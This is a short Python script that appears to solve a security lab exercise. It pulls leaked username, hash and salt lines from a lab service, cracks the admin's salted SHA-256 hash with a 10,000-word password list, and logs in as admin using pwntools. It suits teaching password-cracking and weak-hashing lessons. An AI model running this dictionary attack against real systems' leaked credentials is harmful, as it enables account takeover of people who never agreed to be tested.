#!/usr/bin/env python3
import pwn
import time
from lab_utils import login, print_buf
import hashlib



con, buf = login(7)

lines = buf.decode(errors="replace").split("\n")

# Name | Hash | Salt
leak = []

for i, line in enumerate(lines): 
    if "LEAK" in line: 
        for j in range(15):
            l = lines[i + j + 1] 
            # split = l.split(" :: ")
            # print(f"leaked line: {split} \n")
            leak.append(l.split(" :: "))

admin = None
for comb in leak: 
    if comb[0] == "admin":
        admin = comb

print(admin)

f = open("10000_passwords.txt")

solution = None

for word in f: 
    h = (word.strip() + admin[2]).encode("utf-8")
    if hashlib.sha256(h).hexdigest() == admin[1]:
         print(f"FOUND -- Solution = {word}\n")
         solution = word
         break
    
con.sendline("admin")
time.sleep(0.5)
con.sendline(solution)

print_buf(con) 


